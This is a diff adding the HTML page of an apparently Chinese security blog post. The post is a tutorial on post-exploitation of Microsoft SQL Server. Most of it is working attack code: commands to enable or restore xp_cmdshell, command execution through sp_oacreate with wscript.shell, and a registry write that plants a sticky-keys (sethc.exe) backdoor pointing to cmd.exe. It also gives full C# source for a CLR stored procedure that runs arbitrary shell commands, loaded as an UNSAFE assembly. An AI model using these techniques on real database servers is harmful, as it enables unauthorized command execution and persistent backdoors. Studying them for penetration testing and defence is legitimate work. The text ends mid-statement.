@@ -1,0 +1,1182 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="MSSQL 一般利用方式, Zh0um1&#39;s Blog">
+    <meta name="description" content="简介SQL Server 是 Microsoft 开发的关系数据库管理系统（RDBMS）。 它是市场上最受欢迎的 DBMS 之一。SQL Server 具有极其广泛的用途，它可以在各个方面使用,从存储个人博客的内容到存储客户数据等
+在 20">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>MSSQL 一般利用方式 | Zh0um1&#39;s Blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Zh0um1&#39;s Blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Zh0um1&#39;s Blog</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/23.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">MSSQL 一般利用方式</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/MSSQL/">
+                                <span class="chip bg-color">MSSQL</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2022-03-20
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>SQL Server 是 Microsoft 开发的关系数据库管理系统（RDBMS）。 它是市场上最受欢迎的 DBMS 之一。SQL Server 具有极其广泛的用途，它可以在各个方面使用,从存储个人博客的内容到存储客户数据等</p>
+<p>在 2017 版之前，SQL Server 仅适用于 Windows。 SQL Server 2017 中最大的变化之一是，它现在可在 Linux 和 Docker 容器上使用。 这意味着可以在 Mac 上运行 SQL Server</p>
+<h1 id="危险的存储过程"><a href="#危险的存储过程" class="headerlink" title="危险的存储过程"></a>危险的存储过程</h1><h2 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h2><h3 id="查询-xp-cmdshell-存储过程是否存在"><a href="#查询-xp-cmdshell-存储过程是否存在" class="headerlink" title="查询 xp_cmdshell 存储过程是否存在"></a>查询 xp_cmdshell 存储过程是否存在</h3><p>xtype 为对象类型，xtype&#x3D;’x’，表示存储过程的对象类型为扩展存储过程</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysobjects <span class="token keyword">where</span> xtype<span class="token operator">=</span><span class="token string">'x'</span> <span class="token operator">and</span> name<span class="token operator">=</span><span class="token string">'xp_cmdshell'</span>
+
+<span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysobjects <span class="token keyword">where</span> xtype<span class="token operator">=</span><span class="token string">'x'</span> <span class="token operator">and</span> name<span class="token operator">=</span><span class="token string">'xp_cmdshell'</span> <span class="token comment"># 存在则返回 1</span></code></pre>
+
+<h3 id="xp-cmdshell-的开启与关闭"><a href="#xp-cmdshell-的开启与关闭" class="headerlink" title="xp_cmdshell 的开启与关闭"></a>xp_cmdshell 的开启与关闭</h3><p>开启</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span><span class="token keyword">EXEC</span> sp_configure <span class="token string">'xp_cmdshell'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span></code></pre>
+
+<p>关闭</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span><span class="token keyword">EXEC</span> sp_configure <span class="token string">'xp_cmdshell'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span></code></pre>
+
+<h3 id="恢复-xp-cmdshell-存储过程"><a href="#恢复-xp-cmdshell-存储过程" class="headerlink" title="恢复 xp_cmdshell 存储过程"></a>恢复 xp_cmdshell 存储过程</h3><p>Error Message: 未能找到存储过程 ‘master..xp_cmdshell’，即 xp_cmdshell 被删除，恢复方式如下</p>
+<p>第一步删除</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">drop</span> <span class="token keyword">procedure</span> sp_addextendedproc
+<span class="token keyword">drop</span> <span class="token keyword">procedure</span> sp_oacreate
+<span class="token keyword">exec</span> sp_dropextendedproc <span class="token string">'xp_cmdshell'</span></code></pre>
+
+<p>第二步恢复</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">dbcc</span> addextendedproc<span class="token punctuation">(</span><span class="token string">"sp_oacreate"</span><span class="token punctuation">,</span><span class="token string">"odsole70.dll"</span><span class="token punctuation">)</span>
+<span class="token keyword">dbcc</span> addextendedproc<span class="token punctuation">(</span><span class="token string">"xp_cmdshell"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span></code></pre>
+
+<p>上传 xplog70.dll，恢复扩展存储过过程 xp_cmdshell</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">dbcc</span> addextendedproc<span class="token punctuation">(</span><span class="token string">"xp_cmdshell"</span><span class="token punctuation">,</span><span class="token string">"xplog70.dll"</span><span class="token punctuation">)</span></code></pre>
+
+<h2 id="注册表相关操作"><a href="#注册表相关操作" class="headerlink" title="注册表相关操作"></a>注册表相关操作</h2><p>SQL Server 存在一系列的存储过程，可以对注册表进行增删改查。xp_regread、xp_regwrite、xp_regdeletvalue、xp_regdeletkey、xp_regaddmultistring 等</p>
+<h3 id="xp-regread-读注册表"><a href="#xp-regread-读注册表" class="headerlink" title="xp_regread 读注册表"></a>xp_regread 读注册表</h3><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> xp_regread <span class="token string">'HKEY_current_user'</span><span class="token punctuation">,</span><span class="token string">'Control Panel\International'</span><span class="token punctuation">,</span><span class="token string">'sCountry'</span>
+<span class="token comment"># exec xp_regread [键], [子键], [键值]</span>
+<span class="token keyword">exec</span> xp_regread N<span class="token string">'HKEY_LOCAL_MACHINE'</span><span class="token punctuation">,</span> N<span class="token string">'SYSTEM\CurrentControlSet\Services\MSSEARCH'</span> <span class="token comment"># 判断子健是否存在</span></code></pre>
+
+<h3 id="xp-regaddmultistring-枚举可用的注册表键值"><a href="#xp-regaddmultistring-枚举可用的注册表键值" class="headerlink" title="xp_regaddmultistring 枚举可用的注册表键值"></a>xp_regaddmultistring 枚举可用的注册表键值</h3><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> xp_regenumkeys <span class="token string">'HKEY_CURRENT_USER'</span><span class="token punctuation">,</span><span class="token string">'Control Panel\International'</span></code></pre>
+
+<h3 id="xp-regwrite-修改注册表"><a href="#xp-regwrite-修改注册表" class="headerlink" title="xp_regwrite 修改注册表"></a>xp_regwrite 修改注册表</h3><p>查看 xp_regwrite 是否启用</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysobjects <span class="token keyword">where</span> xtype<span class="token operator">=</span><span class="token string">'x'</span> <span class="token operator">and</span> name<span class="token operator">=</span><span class="token string">'xp_regwrite'</span></code></pre>
+
+<p>开启 xp_regwrite</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span>
+<span class="token keyword">RECONFIGURE</span>
+<span class="token keyword">EXEC</span> sp_configure <span class="token string">'xp_regwrite'</span><span class="token punctuation">,</span> <span class="token number">1</span>
+<span class="token keyword">RECONFIGURE</span></code></pre>
+
+<p>关闭 xp_regwrite</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span>
+<span class="token keyword">RECONFIGURE</span>
+<span class="token keyword">EXEC</span> sp_configure <span class="token string">'xp_regwrite'</span><span class="token punctuation">,</span> <span class="token number">0</span> 
+<span class="token keyword">RECONFIGURE</span></code></pre>
+
+<p>修改注册表</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> xp_regwrite <span class="token variable">@rootkey</span><span class="token operator">=</span><span class="token string">'HKEY_LOCAL_MACHINE'</span><span class="token punctuation">,</span><span class="token variable">@key</span><span class="token operator">=</span><span class="token string">'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.EXE'</span><span class="token punctuation">,</span><span class="token variable">@value_name</span><span class="token operator">=</span><span class="token string">'Debugger'</span><span class="token punctuation">,</span><span class="token variable">@type</span><span class="token operator">=</span><span class="token string">'REG_SZ'</span><span class="token punctuation">,</span><span class="token variable">@value</span><span class="token operator">=</span><span class="token string">'c:\windows\system32\cmd.exe'</span>
+<span class="token comment"># 修改粘滞键的键值</span></code></pre>
+
+<h3 id="xp-regdeletekey-删除指定注册表键值对"><a href="#xp-regdeletekey-删除指定注册表键值对" class="headerlink" title="xp_regdeletekey 删除指定注册表键值对"></a>xp_regdeletekey 删除指定注册表键值对</h3><p>删除粘滞键的键值</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql">xp_regdeletekey <span class="token string">'HKEY_LOCAL_MACHINE'</span><span class="token punctuation">,</span> <span class="token string">'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe'</span></code></pre>
+
+<h2 id="xp-fileexist"><a href="#xp-fileexist" class="headerlink" title="xp_fileexist"></a>xp_fileexist</h2><p>判读文件是否存在，第一列返回 0 表示文件不存在，返回 1 表示文件存在。当执行完无回显命令时，一般都将结果输入至文件中，利用此存储过程可以判断无回显命令是否执行成功</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> xp_fileexist <span class="token string">'C:\Users\MSSQLSERVER\1.txt'</span></code></pre>
+
+<h2 id="xp-subdirs"><a href="#xp-subdirs" class="headerlink" title="xp_subdirs"></a>xp_subdirs</h2><p>列出当前目录</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> xp_subdirs <span class="token string">"C:\\"</span></code></pre>
+
+<h2 id="xp-getnetname"><a href="#xp-getnetname" class="headerlink" title="xp_getnetname"></a>xp_getnetname</h2><p>获取服务器名称</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> xp_getnetname</code></pre>
+
+<h2 id="xp-msver"><a href="#xp-msver" class="headerlink" title="xp_msver"></a>xp_msver</h2><p>获取服务器信息</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> xp_msver</code></pre>
+
+<h1 id="SQL-Server-COM-组件"><a href="#SQL-Server-COM-组件" class="headerlink" title="SQL Server COM 组件"></a>SQL Server COM 组件</h1><p>SQL Server 中的 COM 组件 SP_OACREATE，执行系统命令，但是此利用方法无回显</p>
+<h2 id="查询-SP-OACREATE-是否存在"><a href="#查询-SP-OACREATE-是否存在" class="headerlink" title="查询 SP_OACREATE 是否存在"></a>查询 SP_OACREATE 是否存在</h2><p>返回 1 则存在</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysobjects <span class="token keyword">where</span> xtype<span class="token operator">=</span><span class="token string">'x'</span> <span class="token operator">and</span> name<span class="token operator">=</span><span class="token string">'SP_OACREATE'</span></code></pre>
+
+<h2 id="SP-OACREATE-的开启与关闭"><a href="#SP-OACREATE-的开启与关闭" class="headerlink" title="SP_OACREATE 的开启与关闭"></a>SP_OACREATE 的开启与关闭</h2><p>开启</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token keyword">RECONFIGURE</span> <span class="token keyword">WITH</span> OVERRIDE<span class="token punctuation">;</span>   
+<span class="token keyword">exec</span> sp_configure <span class="token string">'Ole Automation Procedures'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token keyword">RECONFIGURE</span> <span class="token keyword">WITH</span> OVERRIDE<span class="token punctuation">;</span></code></pre>
+
+<p>关闭</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token keyword">RECONFIGURE</span> <span class="token keyword">WITH</span> OVERRIDE<span class="token punctuation">;</span>   
+<span class="token keyword">exec</span> sp_configure <span class="token string">'Ole Automation Procedures'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token keyword">RECONFIGURE</span> <span class="token keyword">WITH</span> OVERRIDE<span class="token punctuation">;</span></code></pre>
+
+<h2 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h2><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">declare</span> <span class="token variable">@shell</span> <span class="token keyword">int</span> <span class="token keyword">exec</span> sp_oacreate <span class="token string">'wscript.shell'</span><span class="token punctuation">,</span><span class="token variable">@shell</span> output <span class="token keyword">exec</span> sp_oamethod <span class="token variable">@shell</span><span class="token punctuation">,</span><span class="token string">'run'</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token string">'C:\Windows\System32\cmd.exe /c whoami /all > C:\\Users\\MSSQLSERVER\\test.txt'</span></code></pre>
+
+<h1 id="SQL-Server-CLR-相关利用"><a href="#SQL-Server-CLR-相关利用" class="headerlink" title="SQL Server CLR 相关利用"></a>SQL Server CLR 相关利用</h1><p>公共语言运行时 (CLR) 集成编程概念<br>从 SQL Server 2005 (9.x) 开始，SQL Server 集成了用于 Microsoft Windows 的 .NET Framework 的公共语言运行时 (CLR) 组件。 这意味着现在可以使用任何 .NET Framework 语言（包括 Microsoft Visual Basic .NET 和 Microsoft Visual C#）来编写存储过程、触发器、用户定义类型、用户定义函数、用户定义聚合和流式表值函数</p>
+<p>CLR 方式可以利用 16 进制文件流方式导入 DLL 文件，不需要文件落地</p>
+<p>利用步骤</p>
+<ol>
+<li>编写 CLR</li>
+<li>启用 MSSQL CLR 功能</li>
+<li>利用 SQL 语句导入程序集</li>
+<li>执行系统命令</li>
+</ol>
+<h2 id="编写-CLR"><a href="#编写-CLR" class="headerlink" title="编写 CLR"></a>编写 CLR</h2><p>使用 Visual Studio 创建工程</p>
+<p><img src="/MSSQL-%E4%B8%80%E8%88%AC%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20220320205141716.png" alt="image-20220320205141716"></p>
+<p>修改目标平台和勾选创建脚本，这里是 SQL Server 2014</p>
+<p><img src="/MSSQL-%E4%B8%80%E8%88%AC%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20220320205354905.png" alt="image-20220320205354905"></p>
+<p>修改目标框架和权限级别为 UNSAFE</p>
+<p><img src="/MSSQL-%E4%B8%80%E8%88%AC%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20220320205406216.png" alt="image-20220320205406216"></p>
+<blockquote>
+<p>在 SQL Server 2005 中引入了从 MSSQL 运行.NET 代码的功能，并在后续版本中叠加了许多保护措施，来限制代码可以访问的内容。在创建.Net 程序集时，会给它们指定一个权限级别<br>其权限集有三个选项</p>
+<blockquote>
+<p>SAFE：基本上只将 MSSQL 数据集暴露给代码，其他大部分操作则都被禁止<br>EXTERNAL_ACCESS：允许访问底层服务器上某些资源，但不应该允许直接执行代码<br>UNSAFE：允许使用任何代码</p>
+</blockquote>
+</blockquote>
+<p>创建 SQL CLR C# 存储过程</p>
+<p><img src="/MSSQL-%E4%B8%80%E8%88%AC%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20220320205413749.png" alt="image-20220320205413749"></p>
+<p>代码如下</p>
+<pre class="language-c#" data-language="c#"><code class="language-c#">using System;
+using System.Data;
+using System.Data.SqlClient;
+using System.Data.SqlTypes;
+using System.Diagnostics;
+using System.Text;
+using Microsoft.SqlServer.Server;
+
+public partial class StoredProcedures
+&#123;
+    [Microsoft.SqlServer.Server.SqlProcedure]
+    public static void ExecCommand (string cmd)
+    &#123;
+        &#x2F;&#x2F; 在此处放置代码
+        SqlContext.Pipe.Send(&quot;Command is running, please wait.&quot;);
+        SqlContext.Pipe.Send(RunCommand(&quot;cmd.exe&quot;, &quot; &#x2F;c &quot; + cmd));
+    &#125;
+    public static string RunCommand(string filename,string arguments)
+    &#123;
+        var process &#x3D; new Process();
+
+        process.StartInfo.FileName &#x3D; filename;
+        if (!string.IsNullOrEmpty(arguments))
+        &#123;
+            process.StartInfo.Arguments &#x3D; arguments;
+        &#125;
+
+        process.StartInfo.CreateNoWindow &#x3D; true;
+        process.StartInfo.WindowStyle &#x3D; ProcessWindowStyle.Hidden;
+        process.StartInfo.UseShellExecute &#x3D; false;
+
+        process.StartInfo.RedirectStandardError &#x3D; true;
+        process.StartInfo.RedirectStandardOutput &#x3D; true;
+        var stdOutput &#x3D; new StringBuilder();
+        process.OutputDataReceived +&#x3D; (sender, args) &#x3D;&gt; stdOutput.AppendLine(args.Data);
+        string stdError &#x3D; null;
+        try
+        &#123;
+            process.Start();
+            process.BeginOutputReadLine();
+            stdError &#x3D; process.StandardError.ReadToEnd();
+            process.WaitForExit();
+        &#125;
+        catch (Exception e)
+        &#123;
+            SqlContext.Pipe.Send(e.Message);
+        &#125;
+
+        if (process.ExitCode &#x3D;&#x3D; 0)
+        &#123;
+            SqlContext.Pipe.Send(stdOutput.ToString());
+        &#125;
+        else
+        &#123;
+            var message &#x3D; new StringBuilder();
+
+            if (!string.IsNullOrEmpty(stdError))
+            &#123;
+                message.AppendLine(stdError);
+            &#125;
+
+            if (stdOutput.Length !&#x3D; 0)
+            &#123;
+                message.AppendLine(&quot;Std output:&quot;);
+                message.AppendLine(stdOutput.ToString());
+            &#125;
+            SqlContext.Pipe.Send(filename + arguments + &quot; finished with exit code &#x3D; &quot; + process.ExitCode + &quot;: &quot; + message);
+        &#125;
+        return stdOutput.ToString();
+    &#125;
+&#125;</code></pre>
+
+<p>编译生成 DLL</p>
+<p><img src="/MSSQL-%E4%B8%80%E8%88%AC%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20220320205430338.png" alt="image-20220320205430338"></p>
+<h2 id="启用-CLR"><a href="#启用-CLR" class="headerlink" title="启用 CLR"></a>启用 CLR</h2><h3 id="SQL-Server-2017-版本之前"><a href="#SQL-Server-2017-版本之前" class="headerlink" title="SQL Server 2017 版本之前"></a>SQL Server 2017 版本之前</h3><pre class="language-sql" data-language="sql"><code class="language-sql">sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span> <span class="token comment">-- 显示高级选项</span>
+sp_configure <span class="token string">'clr enabled'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span> <span class="token comment">-- 启用CLR</span>
+<span class="token keyword">ALTER</span> <span class="token keyword">DATABASE</span> master <span class="token keyword">SET</span> TRUSTWORTHY <span class="token keyword">ON</span><span class="token punctuation">;</span> <span class="token comment">-- 将存储.Net程序集的数据库配置为可信赖的</span></code></pre>
+
+<h3 id="SQL-Server-2017-版本及之后"><a href="#SQL-Server-2017-版本及之后" class="headerlink" title="SQL Server 2017 版本及之后"></a>SQL Server 2017 版本及之后</h3><pre class="language-sql" data-language="sql"><code class="language-sql">sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span>
+sp_configure <span class="token string">'clr enabled'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span>
+sp_add_trusted_assembly <span class="token variable">@hash</span><span class="token operator">=</span> <span class="token operator">&lt;</span>SHA512 <span class="token keyword">of</span> DLL<span class="token operator">></span><span class="token punctuation">;</span> <span class="token comment">-- 将某程序集的SHA512哈希值添加到可信程序集列表中</span></code></pre>
+
+<h2 id="程序集的导入和创建"><a href="#程序集的导入和创建" class="headerlink" title="程序集的导入和创建"></a>程序集的导入和创建</h2><p>通过十六进制字符串创建程序集</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> ASSEMBLY clrassem <span class="token keyword">from</span> <span class="token operator">&lt;</span>HEX STRING<span class="token operator">></span> <span class="token keyword">WITH</span> PERMISSION_SET <span class="token operator">=</span> UNSAFE</code></pre>
+
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> ASSEMBLY <span class="token punctuation">[</span>CLR<span class="token punctuation">]</span>
+  <span class="token keyword">AUTHORIZATION</span> <span class="token punctuation">[</span>dbo<span class="token punctuation">]</span>
+  <span class="token keyword">FROM</span> <span class="token number">0x4d5a</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+  <span class="token keyword">WITH</span> PERMISSION_SET <span class="token operator">=</span> UNSAFE<span class="token punctuation">;</span>
+GO</code></pre>
+
+<p>创建存储过程，以从程序集运行代码</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">PROCEDURE</span> debugrun <span class="token keyword">AS</span> EXTERNAL NAME clrassem<span class="token punctuation">.</span>StoredProcedures<span class="token punctuation">.</span>runner</code></pre>
+
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">PROCEDURE</span> <span class="token punctuation">[</span>dbo<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">[</span>ExecCommand<span class="token punctuation">]</span>
+<span class="token variable">@cmd</span> NVARCHAR <span class="token punctuation">(</span>MAX<span class="token punctuation">)</span>
